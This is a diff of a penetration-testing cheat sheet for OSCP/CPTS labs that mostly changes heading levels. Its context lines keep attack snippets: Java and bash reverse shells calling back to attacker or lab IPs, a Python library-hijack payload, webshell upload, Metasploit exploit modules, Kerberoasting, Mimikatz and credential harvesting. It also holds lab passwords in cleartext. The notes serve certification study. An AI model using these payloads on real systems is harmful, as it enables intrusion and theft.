@@ -6,7 +6,7 @@ tags: [OSCP, CPTS, Methodology, Cheat Sheet, Active Directory, Pentesting]
 toc: true
 ---
 
-# Checklist : 
+## Checklist : 
 
 ### Linux :
 
@@ -32,12 +32,12 @@ toc: true
 - **After Root :**
 - **Check the shadow file and root folder for important files , maybe some creds , crack the shadow file , you will need the passwd + shadow = unshadow then John .**
 
-## Windows :
+### Windows :
 
 - **Check for Quick wins , PS history , Config files .**
 - **Check downloaded Programs that are unsual .**
 
-## Domains :
+### Domains :
 
 - **Always run nxc on all IPs to get the computer names , identify servers and DCs .**
 - **Always Check the Network interfaces on every machine that we get access to , we can do a ping Sweep (In Cross Forest)**
@@ -45,7 +45,7 @@ toc: true
 - **Make sure you modify the Host file to have DC as Domain Name as well (Only DC)**
 
 
-# Enumeration :
+## Enumeration :
 
 ### Scanning :
 
@@ -85,7 +85,7 @@ ftp> passive off
 This will fix it . 
 ```
 
-# Web Application :
+## Web Application :
 
 ### Crawling :
 
@@ -144,7 +144,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## Wordpress :
+### Wordpress :
 
 Enumeration : 
 
@@ -186,21 +186,21 @@ select * from wp_users ;
 Always check the SSH Keys for easy access . 
 ```
 
-## Command Injection :
+### Command Injection :
 
 ```bash
 https://github.com/payloadbox/command-injection-payload-list
 Use this whenever we have a parametere that gets used with a command . 
 ```
 
-## File Upload :
+### File Upload :
 
 ```bash
 Always check for Extensions that are allowed , try php5 , phtml , ... 
 /usr/share/webshells/ : Then check the one for the Technology used . 
 ```
 
-## SQL Injection :
+### SQL Injection :
 
 ```bash
 # Via GraphQL : 
@@ -236,7 +236,7 @@ those numbers with our DB query .
 Now we just navigae to IP:80/Shell.php?exec=command : to execute the commands .   
 ```
 
-## LFI / RFI :
+### LFI / RFI :
 
 **Testing For LFI :** 
 
@@ -274,7 +274,7 @@ Now if we can read files , always think about reading Files inside of the users 
 
 ```
 
-## Login Page :
+### Login Page :
 
 **Auth Bypass via SQL Injection :** 
 
@@ -282,7 +282,7 @@ Now if we can read files , always think about reading Files inside of the users 
 https://github.com/austinsonger/SQL-Injection-Authentication-Bypass-Cheat-Sheet
 ```
 
-## Apache Tomcat :
+### Apache Tomcat :
 
 ```bash
 auxiliary(scanner/http/tomcat_mgr_login) : This will give us the creds to login
@@ -366,9 +366,9 @@ exploit/windows/smb/ms17_010_eternalblue : SMB v1
 exploit/windows/smb/ms17_010_psexec : SMB v2
 ```
 
-# Post Exploitation :
+## Post Exploitation :
 
-## Shell Stabilizer :
+### Shell Stabilizer :
 
 ```bash
 which python
@@ -391,7 +391,7 @@ Or : PS1='\[\e[31m\]\u\[\e[96m\]@\[\e[35m\]\H\[\e[0m\]:\[\e[93m\]\w\[\e[0m\]\$ '
 
 ```
 
-## Pivoting / Tunneling :
+### Pivoting / Tunneling :
 
 Finding different subnets : 
 
@@ -492,9 +492,9 @@ sudo ip route add 172.16.2.101/32 dev ligoloX
 
 ```
 
-# Linux Priv Escalation :
+## Linux Priv Escalation :
 
-## Quick Wins :
+### Quick Wins :
 
 ```bash
 id : Check for Groups and Which user . 
@@ -578,7 +578,7 @@ Once this is executed , we should get a rool shell by running :
 
 ```
 
-## Processes Abuse :
+### Processes Abuse :
 
 ```bash
 wget http://10.10.14.139/pspy
@@ -586,7 +586,7 @@ wget http://10.10.14.139/pspy
 # Look for UID=0  ===> those are ran by Root . 
 ```
 
-## Python script abuse :
+### Python script abuse :
 
 ```bash
 If a Python script that is ran by root calls a library that doesn''t exist , we can 
@@ -606,7 +606,7 @@ import os
 os.system("bash -i >& /dev/tcp/YOUR_IP/4444 0>&1")
 ```
 
-## Path Abuse :
+### Path Abuse :
 
 ```bash
 If we have an SUID that executes bunch of binaries inside of a script , if the binary 
@@ -635,7 +635,7 @@ cp we get our RevShell executed Now all we need to do is execute our SUID binary
 inside of it , it will execute our cp binary .   
 ```
 
-## LinPeas.exe :
+### LinPeas.exe :
 
 ```bash
 # carlospolop privilege-escalation-awesome-scripts-suite/tree/master/linPEAS . 
@@ -643,14 +643,14 @@ inside of it , it will execute our cp binary .
 ./linpeas.exe . 
 ```
 
-## Searching for Passwords :
+### Searching for Passwords :
 
 ```bash
 grep -ri "password"
 grep -riE "connect|.*connect|connect.*"
 ```
 
-## Vulnerable SUID / Binaries :
+### Vulnerable SUID / Binaries :
 
 ```bash
 Bash : bash -p : SUID 
@@ -718,7 +718,7 @@ WantedBy=multi-user.target
 sudo -u#-1 /bin/bash : we can bypass it by doing this. 
 ```
 
-## Git :
+### Git :
 
 ```bash
 If we find a .git file always read them , we might find creds there . 
@@ -726,7 +726,7 @@ We found Creds for Gitea login , we read the code , see if we can modify it .
 See if we can modify the file or executable it executes as root or smt like that . 
 ```
 
-## Credential Harvesting :
+### Credential Harvesting :
 
 ```bash
 # Firefox : 
@@ -738,9 +738,9 @@ sqlite3 places.sqlite 'SELECT url, title FROM moz_places ORDER BY last_visit_dat
 
 ```
 
-# Active Directory :
+## Active Directory :
 
-## Check List :
+### Check List :
 
 - Scan All TCP Ports : Check The useful note Down for more info .
 - Check ldap , rpc , smb with anonymous access . Check for Public Shares .
@@ -757,15 +757,15 @@ if you get access , Look for usernames using netexec , --rid-brute , --users and
 - If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
 - If we can't privesc , we can move to Blood Hound .
 
-## Still Stuck ?
+### Still Stuck ?
 
 - **Check for executables that exist on shares or applications .**
 - **On a Local machine if nothing gives any value check the programs installed for a Priv Esc vector . (On Program Files after C:\).**
 - **Check for Executables that you can reverse engineer maybe for some credentials .**
 
-## Without Credentials :
+### Without Credentials :
 
-### Enumerating DNS :
+#### Enumerating DNS :
 
 ```bash
 dnsrecon -d Domain -n $target : Scan for dns . 
@@ -773,7 +773,7 @@ dnsrecon -d Domain -n $target : Scan for dns .
 dig DomainName @IP axfr : Zone transfer . 
 ```
 
-### Enumerating RPC :
+#### Enumerating RPC :
 
 ```bash
 rpcclient -U "" -N $target . 
@@ -781,7 +781,7 @@ rpcclient -U "" -N $target .
 enumdomusers . 
 ```
 
-### Enumerating NFS :
+#### Enumerating NFS :
 
 ```bash
 # This is found on book.hacktricks.wiki 
@@ -800,7 +800,7 @@ mount -t nfs '[-o vers=2]' $target:/users(name of the drive to mount) /tmp/mnt/f
 
 ```
 
-### Enumerating Web :
+#### Enumerating Web :
 
 ```bash
 gobuster dir -u http://$target -w /usr/share/seclists/raft-large-directories -t 50 -o gb_dirs.txt . 
@@ -808,7 +808,7 @@ gobuster dir -u http://$target -w /usr/share/seclists/raft-large-directories -t 
 gobuster dir -u http://$target -w /usr
 ```
 
-### Enumerating LDAP :
+#### Enumerating LDAP :
 
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 $target : Enumerate LDAP with anon.
@@ -821,7 +821,7 @@ ldapdomaindump $target -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO
 ===> Look for something like Info , description , SamAccountName and check if u find smt.  
 ```
 
-### Null Session :
+#### Null Session :
 
 ```bash
 netexec smb $target : Find Domain Name to add it to /etc/hosts . 
@@ -840,7 +840,7 @@ netexec smb $target -u '' -p '' --rid-brute
 
 ```
 
-### Brute Force :
+#### Brute Force :
 
 ```bash
 
@@ -859,7 +859,7 @@ ffuf -u 'http://127.0.0.1:8080' -w /usr/share/wordlist/rockyou.txt -d 'username=
 
 ```
 
-### Username Generation :
+#### Username Generation :
 
 ```bash
 #https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py
@@ -867,7 +867,7 @@ ffuf -u 'http://127.0.0.1:8080' -w /usr/share/wordlist/rockyou.txt -d 'username=
 python3 username-generator.py -u username.txt -o genrated_username.txt  
 ```
 
-### Kerbrute :
+#### Kerbrute :
 
 ```bash
 kerbrute userenum generated_usernames.txt --dc $target -d Domain
@@ -877,7 +877,7 @@ kerbrute userenum /usr/share/Usernames/Names/names.txt --dc $target -d Domain
 
 ## With Credentials :
 
-### Generating Users :
+#### Generating Users :
 
 ```bash
 netexec smb $target -u 'Username' -p 'Password' --rid-brute : Generate a list of users .
@@ -886,7 +886,7 @@ netexec smb $target -u 'Username' -p 'Password' --rid-brute  | grep -i 'sidtypeu
  
 ```
 
-### ASREP Roasting :
+#### ASREP Roasting :
 
 ```bash
 impacket-GetNPUsers  htb.local/ -dc-ip $target -usersfile users.txt -outputfile Hashes.txt
@@ -899,7 +899,7 @@ Jhon : --format=krb5asrep
 Hashcat Mode : 18200
 ```
 
-### Kerberoasting :
+#### Kerberoasting :
 
 ```bash
 #Method 1: 
@@ -932,7 +932,7 @@ Rubeus.exe kerberoast /outfile:hashes.txt
 Rubeus.exe asreproast /outfile:hashes.txt 
 ```
 
-### Testing All Protocols :
+#### Testing All Protocols :
 
 ```bash
 netexec smb $target -u 'username' -p 'Password'
@@ -943,7 +943,7 @@ netexec rdp $target -u 'username' -p 'Password'
 netexec winrm $target -u 'username' -p 'Password'
 ```
 
-### Shares :
+#### Shares :
 
 **Enumerating Shares :** 
 
@@ -996,7 +996,7 @@ If we have acess the Web Share , we can uplaod a Shell and navigate into it .
 ****
 ```
 
-### Certification Abuse :
+#### Certification Abuse :
 
 ```bash
 Here we are looking for a vulenrability in the certificate assignment on the domain , 
@@ -1128,7 +1128,7 @@ xp_dirtree \\KaliIP\Share
 On Kali : responder -I  tun0 -A -v 
 ```
 
-## Blood Hound :
+### Blood Hound :
 
 ```bash
 nxc ldap $target -u 't-skid' -p 'tj072889*' --bloodhound --collection All --dns-server $target 
@@ -1248,7 +1248,7 @@ Just do Syteminfo , copy the out put and give it to wes.py , it s in OPT ;
 python3 script.py --url http://172.16.1.102:80 -c 'powershell -e "EncodedPayload"'
 ```
 
-## Check List :
+### Check List :
 
 ```bash
 Step 1 : Run whoami /priv . + whoami /all + Check PowerShell History file + Services .  
@@ -1622,9 +1622,9 @@ evil-winrm -i IP -k PublicKeyExtracted -c CertExtracted -S
 xfreerdp /v:$target /u:username /p:password /cert:ignore +clipboard /dynamic-resolution /drive:  + net use will show our shared drive content . 
 ```
 
-# Post Exploitation :
+## Post Exploitation :
 
-## ACL Abuse :
+### ACL Abuse :
 
 ```bash
 # ACL Check : to verify the User's ACLs via Powershell : 
@@ -1652,7 +1652,7 @@ certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -accoun
  
 ```
 
-## Mimikatz :
+### Mimikatz :
 
 ```bash
 # https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1
@@ -1763,7 +1763,7 @@ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.59/4444 0>&1"' > rev.sh
 
 ```
 
-# Cross Forests :
+## Cross Forests :
 
 ```bash
 # Do a ping sweep on Windows on a specific subdomain , Perferably from a DC . 
@@ -1791,7 +1791,7 @@ fping -a -g 172.16.0.0/16 2>/dev/null
 
 ```
 
-## Child —> Parent :
+### Child —> Parent :
 
 **Useful resource :** 
 
@@ -1908,9 +1908,9 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
-# Some Use cases :
+## Some Use cases :
 
-## PFSense :
+### PFSense :
 
 ```bash
 Username : can be anything 
@@ -1929,7 +1929,7 @@ Since we did env command  from earlier and we go that $HOME is / .
 
 ```
 
-## PRTG Monitor :
+### PRTG Monitor :
 
 ```bash
 # Location for PRTG Creds : 
